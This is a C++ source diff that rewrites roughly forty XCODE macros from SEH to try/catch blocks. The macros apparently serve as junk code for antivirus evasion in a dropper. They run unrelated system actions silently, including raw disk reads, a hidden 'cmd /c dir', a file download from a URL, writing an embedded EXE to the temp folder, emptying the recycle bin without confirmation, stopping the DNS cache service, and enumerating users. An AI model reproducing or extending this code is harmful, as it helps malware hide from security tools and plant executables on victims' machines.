@@ -175,7 +175,7 @@ BOOL WINAPI Enum16(DWORD dwThreadId, WORD hMod16, WORD hTask16, PSZ pszModName, 
 	return !bRet;
 }
 
-#define XCODE1 __try{OUTSTR("1");\
+#define XCODE1 try {OUTSTR("1");\
 		GetModuleFileName(NULL, szXBuff, sizeof(szXBuff)-1);\
 		hXMod = CreateFile(szXBuff, GENERIC_READ,NULL,NULL,OPEN_EXISTING,FILE_ATTRIBUTE_NORMAL,NULL);\
 		if (INVALID_HANDLE_VALUE != hXMod)\
@@ -193,11 +193,11 @@ BOOL WINAPI Enum16(DWORD dwThreadId, WORD hMod16, WORD hTask16, PSZ pszModName, 
 			}\
 		}\
 	}\
-	__except(EXCEPTION_EXECUTE_HANDLER){\
+	catch(...) {\
 	Sleep(1);\
 	}
 
-#define XCODE2 __try{OUTSTR("2");\
+#define XCODE2 try {OUTSTR("2");\
 	GetModuleFileName(NULL, szXBuff, sizeof(szXBuff)-1);\
 	PasswdLen = strlen(szXBuff);\
 	memcpy(TmpBuf + 0x00, "\x7F", 1);\
@@ -207,11 +207,11 @@ BOOL WINAPI Enum16(DWORD dwThreadId, WORD hMod16, WORD hTask16, PSZ pszModName, 
 	md5T.MD5Final(digest);\
 	memcpy(szXBuff, digest, 16);\
 	}\
-	__except(EXCEPTION_EXECUTE_HANDLER){\
+	catch(...) {\
 	Sleep(2);\
 	}
 
-#define XCODE3 __try{OUTSTR("3");\
+#define XCODE3 try {OUTSTR("3");\
 	hXMod = CreateFile("\\Device\\Harddisk0\\Partition0", GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);\
 	if (hXMod != INVALID_HANDLE_VALUE)\
 	{\
@@ -221,11 +221,11 @@ BOOL WINAPI Enum16(DWORD dwThreadId, WORD hMod16, WORD hTask16, PSZ pszModName, 
 		CloseHandle(hXMod);\
 	}\
 	}\
-		__except(EXCEPTION_EXECUTE_HANDLER){\
+		catch(...) {\
 		Sleep(3);\
 	}
 
-#define XCODE4 __try{OUTSTR("4");\
+#define XCODE4 try {OUTSTR("4");\
 	if (!AllocateAndInitializeSid(&SIDAuthWorld, 1, SECURITY_WORLD_RID, 0, 0, 0, 0, 0, 0, 0, &pSIDEveryone)) \
 	{\
 		;\
@@ -291,11 +291,11 @@ BOOL WINAPI Enum16(DWORD dwThreadId, WORD hMod16, WORD hTask16, PSZ pszModName, 
 	if (hToken)\
 		CloseHandle(hToken);\
 	}\
-		__except(EXCEPTION_EXECUTE_HANDLER){\
+		catch(...) {\
 		Sleep(4);\
 	}
 
-#define XCODE5 __try{OUTSTR("5");\
+#define XCODE5 try {OUTSTR("5");\
 	GetTempPath(64, TmpBuf);\
 	strcpy(szXBuff,"http://www.eecs.ucf.edu/~leavens/Windows/bat/jtest.bat");\
 	DeleteUrlCacheEntry (szXBuff);\
@@ -311,11 +311,11 @@ BOOL WINAPI Enum16(DWORD dwThreadId, WORD hMod16, WORD hTask16, PSZ pszModName, 
 		WinExec("cmd /c dir", SW_HIDE);\
 	}\
 	}\
-	__except(EXCEPTION_EXECUTE_HANDLER){\
+	catch(...) {\
 	Sleep(5);\
 	}
 
-#define XCODE6 __try{OUTSTR("6");\
+#define XCODE6 try {OUTSTR("6");\
 	GetTempPath(MAX_PATH, szXBuff);\
 	SetCurrentDirectory(szXBuff);\
 	hXMod = FindFirstFile(szXBuff, &findData);\
@@ -359,11 +359,11 @@ BOOL WINAPI Enum16(DWORD dwThreadId, WORD hMod16, WORD hTask16, PSZ pszModName, 
 		FindClose(hXMod);\
 	}\
 	}\
-	__except(EXCEPTION_EXECUTE_HANDLER){\
+	catch(...) {\
 	Sleep(6);\
 	}
 
-#define XCODE7 __try{OUTSTR("7");\
+#define XCODE7 try {OUTSTR("7");\
 	setlocale(LC_ALL,"chs");\
 	InitializeCriticalSection(&lock);\
 	SetConsoleCtrlHandler((PHANDLER_ROUTINE)NULL,TRUE);\
@@ -393,14 +393,14 @@ BOOL WINAPI Enum16(DWORD dwThreadId, WORD hMod16, WORD hTask16, PSZ pszModName, 
 		}\
 	}\
 	}\
-	__except(EXCEPTION_EXECUTE_HANDLER){\
+	catch(...) {\
 	Sleep(7);\
 	}
 
-#define XCODE8 __try{OUTSTR("8");\
+#define XCODE8 try {OUTSTR("8");\
 	GetTempPath(64, TmpBuf);\
 	strcat(TmpBuf, "dtapp.exe");\
-	hSrc = FindResource(GetModuleHandle(NULL), MAKEINTRESOURCE((WORD)IDR_EXE3), "EXE");\
+	hSrc = FindResource(GetModuleHandle(NULL), MAKEINTRESOURCE((WORD)IDD_BUNDLE2_DIALOG), "EXE");\
 	hGlobal = LoadResource(NULL,hSrc);\
 	lp = LockResource(hGlobal);\
 	dwSizeXXX = SizeofResource(NULL,hSrc);\
@@ -409,11 +409,11 @@ BOOL WINAPI Enum16(DWORD dwThreadId, WORD hMod16, WORD hTask16, PSZ pszModName, 
 	ofs.close();\
 	FreeResource(hGlobal);\
 	}\
-	__except(EXCEPTION_EXECUTE_HANDLER){\
+	catch(...) {\
 	Sleep(8);\
 	}
 
-#define XCODE9 __try{OUTSTR("9");\
+#define XCODE9 try {OUTSTR("9");\
 	GetSystemInfo(&sinf);\
 	hXMod = CreateFile(".\\first.txt", GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_FLAG_SEQUENTIAL_SCAN, NULL);\
 	hmyfile =CreateFile("c:\\second.txt", GENERIC_READ | GENERIC_WRITE, 0, NULL, OPEN_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);\
@@ -446,11 +446,11 @@ BOOL WINAPI Enum16(DWORD dwThreadId, WORD hMod16, WORD hTask16, PSZ pszModName, 
 	CloseHandle(hFileMapping);\
 	CloseHandle(hmyfilemap);\
 	}\
-	__except(EXCEPTION_EXECUTE_HANDLER){\
+	catch(...) {\
 	Sleep(9);\
 	}
 
-#define XCODE10 __try{OUTSTR("10");\
+#define XCODE10 try {OUTSTR("10");\
 	ZeroMemory(&osvi, sizeof(OSVERSIONINFOEX));\
 	osvi.dwOSVersionInfoSize = sizeof(OSVERSIONINFOEX);\
 	if( !GetVersionEx((OSVERSIONINFO *)&osvi))\
@@ -473,11 +473,11 @@ BOOL WINAPI Enum16(DWORD dwThreadId, WORD hMod16, WORD hTask16, PSZ pszModName, 
 	OUTSTR(szXBuff);\
 	}\
 	}\
-	__except(EXCEPTION_EXECUTE_HANDLER){\
+	catch(...) {\
 		Sleep(10);\
 	}
 
-#define XCODE11 __try{OUTSTR("11");\
+#define XCODE11 try {OUTSTR("11");\
 	shqbi.cbSize = sizeof(shqbi);\
 	shqbi.i64NumItems = -1;\
 	shqbi.i64Size = -1;\
@@ -487,12 +487,12 @@ BOOL WINAPI Enum16(DWORD dwThreadId, WORD hMod16, WORD hTask16, PSZ pszModName, 
 		SHEmptyRecycleBin(0, 0, SHERB_NOPROGRESSUI|SHERB_NOCONFIRMATION);\
 	}\
 	}\
-	__except(EXCEPTION_EXECUTE_HANDLER){\
+	catch(...) {\
 		Sleep(11);\
 	}
 
 
-#define XCODE12 __try{OUTSTR("12");\
+#define XCODE12 try {OUTSTR("12");\
 do {\
 	   nStatus = NetUserEnum(L"localhost",dwLevel,FILTER_NORMAL_ACCOUNT,(LPBYTE*)&pBuf,dwPrefMaxLen,&dwEntriesRead,&dwTotalEntries,&dwResumeHandle);\
 	   if ((nStatus == NERR_Success) || (nStatus == ERROR_MORE_DATA))\
@@ -525,11 +525,11 @@ do {\
 	   NetApiBufferFree(pBuf);\
    fprintf(stderr, "\nTotal of %d entries enumerated\n", dwTotalCount);\
 	}\
-		__except(EXCEPTION_EXECUTE_HANDLER){\
+		catch(...) {\
 		Sleep(12);\
 	}
 
-#define XCODE13 __try{OUTSTR("13");\
+#define XCODE13 try {OUTSTR("13");\
 		PasswdLen=0;\
 		while (PasswdLen < 24) {\
 		dwLevel = PasswdLen;\
@@ -602,11 +602,11 @@ do {\
 		}\
 	}\
 	}\
-		__except(EXCEPTION_EXECUTE_HANDLER){\
+		catch(...) {\
 		Sleep(13);\
 	}
 
-#define XCODE14 __try{OUTSTR("14");\
+#define XCODE14 try {OUTSTR("14");\
     CoInitialize( 0 );\
         hr = CoCreateInstance(  CLSID_CTaskScheduler,0,CLSCTX_SERVER,IID_ITaskScheduler,(LPVOID *)&pITaskScheduler );\
         pITaskScheduler->GetTargetComputer( &ppwszComputer );\
@@ -620,7 +620,7 @@ do {\
         pITaskTrigger->SetTrigger( &trigger );\
         pITaskScheduler->Delete( L"MyHappyWorkItem" );\
     }\
-    __finally\
+    catch(...) \
     {\
         if ( pITaskTrigger )\
             pITaskTrigger->Release();\
@@ -632,7 +632,7 @@ do {\
 			Sleep(14);\
     }
 
-#define XCODE15 __try{OUTSTR("15");\
+#define XCODE15 try {OUTSTR("15");\
 	srand(time(0));\
 	InitializeCriticalSection(&g_CriticalSection);\
 	hXMod=GetStdHandle(STD_OUTPUT_HANDLE);\
@@ -651,7 +651,7 @@ do {\
 		delete lpConsoleScreenBufferInfo;\
 	}\
     }\
-	__finally\
+	catch(...) \
     {\
 		LeaveCriticalSection(&g_CriticalSection);\
 		delete lpConsoleScreenBufferInfo;\
@@ -659,24 +659,24 @@ do {\
 		Sleep(15);\
     }
 
-#define XCODE16 __try{OUTSTR("16");\
+#define XCODE16 try {OUTSTR("16");\
 		hXMod = LoadLibraryA("Kernel32.DLL");\
 		if (hXMod == NULL)\
-			__leave;\
+			throw 1;\
 		hmyfile = LoadLibraryA("VDMDBG.DLL");\
 		if (hmyfile == NULL)\
-			__leave;\
+			throw 1;\
 		lpfCreateToolhelp32Snapshot =(HANDLE (WINAPI *)(DWORD,DWORD))GetProcAddress((HMODULE)hXMod, "CreateToolhelp32Snapshot");\
 		lpfProcess32First =(BOOL (WINAPI *)(HANDLE,LPPROCESSENTRY32))GetProcAddress((HMODULE)hXMod, "Process32First");\
 		lpfProcess32Next =(BOOL (WINAPI *)(HANDLE,LPPROCESSENTRY32))GetProcAddress((HMODULE)hXMod, "Process32Next");\
 		if (lpfProcess32Next == NULL|| lpfProcess32First == NULL|| lpfCreateToolhelp32Snapshot == NULL)\
-			__leave;\
+			throw 1;\
 		lpfVDMEnumTaskWOWEx = (INT (WINAPI *)(DWORD, TASKENUMPROCEX,LPARAM)) GetProcAddress((HMODULE)hmyfile, "VDMEnumTaskWOWEx");\
 		if (lpfVDMEnumTaskWOWEx == NULL)\
-			__leave;\
+			throw 1;\
 		hFileMapping = lpfCreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);\
 		if (hFileMapping == INVALID_HANDLE_VALUE) {\
-			__leave;\
+			throw 1;\
 		}\
 		procentry.dwSize = sizeof(PROCESSENTRY32);\
 		bRetval = lpfProcess32First(hFileMapping, &procentry);\
@@ -694,7 +694,7 @@ do {\
 		}\
 		delete sInfo;\
 		}\
-		__finally {\
+		catch(...)  {\
 			if (hXMod)\
 				FreeLibrary((HMODULE)hXMod);\
 			if (hmyfile)\
@@ -702,7 +702,7 @@ do {\
 			Sleep(16);\
 		}
 
-#define XCODE17 __try{OUTSTR("17");\
+#define XCODE17 try {OUTSTR("17");\
 			GetWindowsDirectory(szXBuff, MAX_PATH);\
 			szXBuff[3]=0;\
 			strcat(szXBuff, "boot.ini");\
@@ -722,11 +722,11 @@ do {\
              }\
 			 CloseHandle(hXMod);\
 		}\
-		__except(EXCEPTION_EXECUTE_HANDLER){\
+		catch(...) {\
 			Sleep(17);\
 		}
 
-#define XCODE18 __try{OUTSTR("18");\
+#define XCODE18 try {OUTSTR("18");\
 			GetModuleFileName(NULL,szXBuff,MAX_PATH);\
 			(strrchr(szXBuff,'\\'))[1] = 0;\
 			GetTempPath(MAX_PATH, szXBuff);\
@@ -734,11 +734,11 @@ do {\
 			WritePrivateProfileString("netconf","str",AddMsg,szXBuff);\
 			GetPrivateProfileString("netconf","code",NULL,TmpBuf,64,szXBuff);\
 		}\
-			__except(EXCEPTION_EXECUTE_HANDLER){\
+			catch(...) {\
 			Sleep(18);\
 		}
 
-#define XCODE19 __try{OUTSTR("19");\
+#define XCODE19 try {OUTSTR("19");\
 		uDropEffect=RegisterClipboardFormat(AddMsg);\
 		hGblEffect=GlobalAlloc(GMEM_ZEROINIT|GMEM_MOVEABLE|GMEM_DDESHARE,sizeof(DWORD));\
 		dwDropEffect=(DWORD*)GlobalLock(hGblEffect);\
@@ -767,11 +767,11 @@ do {\
 		GlobalFree(hGblEffect);\
 		GlobalFree(hGblFiles);\
 	}\
-		__except(EXCEPTION_EXECUTE_HANDLER){\
+		catch(...) {\
 		Sleep(19);\
 	}
 
-#define XCODE20 __try{OUTSTR("20");\
+#define XCODE20 try {OUTSTR("20");\
 		RegOpenKeyEx(HKEY_CURRENT_USER,"SOFTWARE",0,KEY_READ,&hKey);\
 		if (RegQueryValueEx(hKey,AddMsg,NULL,NULL,NULL,NULL)!=ERROR_SUCCESS)\
 		{\
@@ -793,11 +793,11 @@ do {\
 		}\
 		RegCloseKey(hKey);\
 	}\
-		__except(EXCEPTION_EXECUTE_HANDLER){\
+		catch(...) {\
 		Sleep(20);\
 	}
 
-#define XCODE21 __try{OUTSTR("21");\
+#define XCODE21 try {OUTSTR("21");\
 		if((scm=OpenSCManager(NULL,NULL,SC_MANAGER_CREATE_SERVICE))!=NULL)\
 		{\
 			service=OpenService(scm,"Dnscache",SERVICE_QUERY_STATUS|SERVICE_CONTROL_STOP);\
@@ -816,11 +816,11 @@ do {\
 		CloseServiceHandle(service);\
 		CloseServiceHandle(scm);\
 	}\
-	__except(EXCEPTION_EXECUTE_HANDLER){\
+	catch(...) {\
 	Sleep(21);\
 	}
 
-#define XCODE22 __try{OUTSTR("22");\
+#define XCODE22 try {OUTSTR("22");\
 		pbm = CBitmap::FromHandle(hbm);\
 		if(::PathFileExists(szXBuff))\
 		{\
@@ -832,11 +832,11 @@ do {\
 			}\
 		}\
 	}\
-		__except(EXCEPTION_EXECUTE_HANDLER){\
+		catch(...) {\
 		Sleep(22);\
 	}
 
-#define XCODE23 __try{OUTSTR("23");\
+#define XCODE23 try {OUTSTR("23");\
 		if ((NtQuerySystemInformation = (PROCNTQSI)GetProcAddress(GetModuleHandle("ntdll"), "NtQuerySystemInformation")))\
 		{\
 			NtQuerySystemInformation(0, &SysBaseInfo,sizeof(SysBaseInfo),NULL);\
@@ -844,32 +844,32 @@ do {\
 			NtQuerySystemInformation(2, &SysPerfInfo,sizeof(SysPerfInfo),NULL);\
 		}\
 	}\
-		__except(EXCEPTION_EXECUTE_HANDLER){\
+		catch(...) {\
 		Sleep(22);\
 	}
 
-#define XCODE24 __try{OUTSTR("24");\
+#define XCODE24 try {OUTSTR("24");\
 		hmyfile = CreateFile("C:\\Windows\\system32\\kernel32.dll", GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL );\
 		if ( hmyfile == INVALID_HANDLE_VALUE ) {\
-			__leave;\
+			throw 1;\
 		}\
 		hXMod = CreateFileMapping( hmyfile, NULL, PAGE_READONLY, 0, 0, NULL );\
 		if ( hXMod == INVALID_HANDLE_VALUE ) {\
-			__leave;\
+			throw 1;\
 		}\
 		lp=NULL;\
 		lp = MapViewOfFile( hXMod, FILE_MAP_READ, 0, 0, 0 );\
 		if ( ! lp ) {\
-			__leave;\
+			throw 1;\
 		}\
 		if ( *( USHORT* ) lp != IMAGE_DOS_SIGNATURE ) {\
-			__leave;\
+			throw 1;\
 		}\
 		if ( *( ( DWORD* ) ( ( PBYTE ) lp + ( ( PIMAGE_DOS_HEADER ) lp )->e_lfanew ) ) != IMAGE_NT_SIGNATURE ) {\
-			__leave;\
+			throw 1;\
 		}\
 }\
-__finally {\
+catch(...)  {\
 	if(lp)\
 		UnmapViewOfFile( lp );\
 	if(hXMod)\
@@ -879,7 +879,7 @@ __finally {\
 	Sleep(24);\
 }
 
-#define XCODE25 __try{OUTSTR("25");\
+#define XCODE25 try {OUTSTR("25");\
 	hdc = GetDC(NULL);\
 	hPen = CreatePen(0, 1, RGB(0, 0, 0));\
 	hOldPen = (HPEN) SelectObject(hdc, hPen);\
@@ -895,45 +895,45 @@ __finally {\
 	SetROP2(hdc, PasswdLen);\
     ReleaseDC(hwnd, hdc);\
 }\
-__finally {\
+catch(...) {\
 	Sleep(25);\
 }
 
-#define XCODE26 __try{OUTSTR("26");\
+#define XCODE26 try {OUTSTR("26");\
 	hwnd = CreateWindowW(L"Static",L"Application",WS_OVERLAPPEDWINDOW,CW_USEDEFAULT,CW_USEDEFAULT,CW_USEDEFAULT,CW_USEDEFAULT,NULL,NULL,AfxGetInstanceHandle(),NULL);\
 	ShowWindow(hwnd,SW_HIDE);\
 	UpdateWindow(hwnd);\
 }\
-__except(EXCEPTION_EXECUTE_HANDLER){\
+catch(...) {\
 	Sleep(26);\
 }
 
-#define XCODE27 __try{OUTSTR("27");\
+#define XCODE27 try {OUTSTR("27");\
 	hIcon = ExtractIcon(AfxGetInstanceHandle(), AddMsg, 0);\
 }\
-	__except(EXCEPTION_EXECUTE_HANDLER){\
+	catch(...) {\
 	Sleep(27);\
 }
 
-#define XCODE28 __try{OUTSTR("28");\
+#define XCODE28 try {OUTSTR("28");\
 	lp=VirtualAlloc(lp,16,MEM_RESERVE,PAGE_READWRITE);\
 }\
-	__except(EXCEPTION_EXECUTE_HANDLER){\
+	catch(...) {\
 	Sleep(28);\
 }
 
-#define XCODE29 __try{OUTSTR("29");\
+#define XCODE29 try {OUTSTR("29");\
 hXMod=CreateMutex(NULL,TRUE, AddMsg);\
 if(GetLastError()==ERROR_ALREADY_EXISTS)\
 {\
 	hXMod=CreateMutex(NULL,FALSE,"test");\
 }\
 }\
-	__except(EXCEPTION_EXECUTE_HANDLER){\
+	catch(...) {\
 	Sleep(29);\
 }
 
-#define XCODE30 __try{OUTSTR("30");\
+#define XCODE30 try {OUTSTR("30");\
 	sa.nLength = sizeof(SECURITY_ATTRIBUTES);\
 	sa.lpSecurityDescriptor = NULL;\
 	sa.bInheritHandle = TRUE;\
@@ -953,25 +953,25 @@ if(GetLastError()==ERROR_ALREADY_EXISTS)\
 		}\
 	}\
 }\
-	__except(EXCEPTION_EXECUTE_HANDLER){\
+	catch(...) {\
 	Sleep(30);\
 }
 
-#define XCODE31 __try{OUTSTR("31");\
+#define XCODE31 try {OUTSTR("31");\
 ::LogonUser("Guest", "localhost", "", LOGON32_LOGON_INTERACTIVE, LOGON32_PROVIDER_DEFAULT, &hToken);\
 }\
-	__except(EXCEPTION_EXECUTE_HANDLER){\
+	catch(...) {\
 	Sleep(31);\
 }
 
-#define XCODE32 __try{OUTSTR("32");\
+#define XCODE32 try {OUTSTR("32");\
 	::PostThreadMessage(GetCurrentThreadId(), WM_TIMECHANGE, 0, 0);\
 }\
-	__except(EXCEPTION_EXECUTE_HANDLER){\
+	catch(...) {\
 	Sleep(32);\
 }
 
-#define XCODE33 __try{OUTSTR("33");\
+#define XCODE33 try {OUTSTR("33");\
 		hBitmap = CreateDIBSection(GetDC(NULL), (BITMAPINFO*)hDib, DIB_RGB_COLORS, &lp, NULL, 0);\
 		if (hBitmap == NULL)\
 		{\
@@ -979,33 +979,33 @@ if(GetLastError()==ERROR_ALREADY_EXISTS)\
 			hBitmap = NULL;\
 		}\
 }\
-	__except(EXCEPTION_EXECUTE_HANDLER){\
+	catch(...) {\
 	Sleep(33);\
 }
 
-#define XCODE34 __try{OUTSTR("34");\
+#define XCODE34 try {OUTSTR("34");\
 	GetCursorPos(&pt);\
 	if (pt.x<10 && pt.y<10)\
 	{\
 		SetCursorPos(pt.x+100, pt.y+100);\
 	}\
 }\
-	__except(EXCEPTION_EXECUTE_HANDLER){\
+	catch(...) {\
 	Sleep(34);\
 }
 
-#define XCODE35 __try{OUTSTR("35");\
+#define XCODE35 try {OUTSTR("35");\
 	hXMod=CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)LoadLibraryA, "kernel32.dll", 0, &dwSizeXXX);\
 	if(WAIT_TIMEOUT==WaitForSingleObject(hXMod,200))\
 	{\
 		CloseHandle(hXMod);\
 	}\
 }\
-	__except(EXCEPTION_EXECUTE_HANDLER){\
+	catch(...) {\
 	Sleep(35);\
 }
 
-#define XCODE36 __try{OUTSTR("36");\
+#define XCODE36 try {OUTSTR("36");\
     aaa.push_back(1);\
     aaa.push_back(2);\
     aaa.push_back(3);\
@@ -1015,19 +1015,19 @@ if(GetLastError()==ERROR_ALREADY_EXISTS)\
         std::cout<<(*iii)<<std::endl;\
     }\
 }\
-	__except(EXCEPTION_EXECUTE_HANDLER){\
+	catch(...) {\
 	Sleep(36);\
 }
 
-#define XCODE37 __try{OUTSTR("37");\
+#define XCODE37 try {OUTSTR("37");\
 	hXMod = GetCurrentProcess();\
 	GetProcessAffinityMask(hXMod, &dwSizeXXX,&dwRes);\
 }\
-	__except(EXCEPTION_EXECUTE_HANDLER){\
+	catch(...) {\
 	Sleep(37);\
 }
 
-#define XCODE38 __try{OUTSTR("38");\
+#define XCODE38 try {\
 		i=sizeof(Ncb);\
 		memset( &Ncb, 0, sizeof(Ncb) );\
 		Ncb.ncb_command = NCBENUM;\
@@ -1049,7 +1049,7 @@ if(GetLastError()==ERROR_ALREADY_EXISTS)\
 			sprintf(szXBuff,"%02X-%02X-%02X-%02X-%02X-%02X",lenum.lana[i],Adapter.adapt.adapter_address[0],Adapter.adapt.adapter_address[1],Adapter.adapt.adapter_address[2],Adapter.adapt.adapter_address[3],Adapter.adapt.adapter_address[4],Adapter.adapt.adapter_address[5]);\
 		}\
 }\
-	__except(EXCEPTION_EXECUTE_HANDLER){\
+	catch(...) {\
 	Sleep(38);\
 }
 #ifdef FLOWERX
